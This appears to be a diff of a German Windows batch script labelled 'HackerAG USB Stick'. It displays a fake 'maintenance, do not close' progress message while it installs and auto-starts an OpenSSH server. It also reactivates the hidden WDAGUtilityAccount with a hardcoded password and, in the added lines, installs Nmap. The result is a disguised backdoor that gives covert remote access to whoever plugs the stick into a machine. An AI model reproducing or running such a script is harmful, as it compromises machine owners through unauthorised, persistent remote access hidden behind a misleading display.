@@ -6,11 +6,14 @@ rem //       HackerAG USB Stick
 rem /
 net user HackerAG /delete
 cls
-echo Wartung... [ 1/2 ] [ NICHT SCHLIESSEN ]
+echo Wartung... [ 1/3 ] [ NICHT SCHLIESSEN ]
 powershell Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 cls
-echo Wartung... [ 2/2 ] [ NICHT SCHLIESSEN ]
+echo Wartung... [ 2/3 ] [ NICHT SCHLIESSEN ]
 powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+cls
+echo Wartung... [ 3/3 ] [ NICHT SCHLIESSEN ]
+winget install Insecure.Nmap
 powershell Set-Service -Name sshd -StartupType 'Automatic'
 net user WDAGUtilityAccount /active:yes
 net user WDAGUtilityAccount FKejx80snc2WF_rM
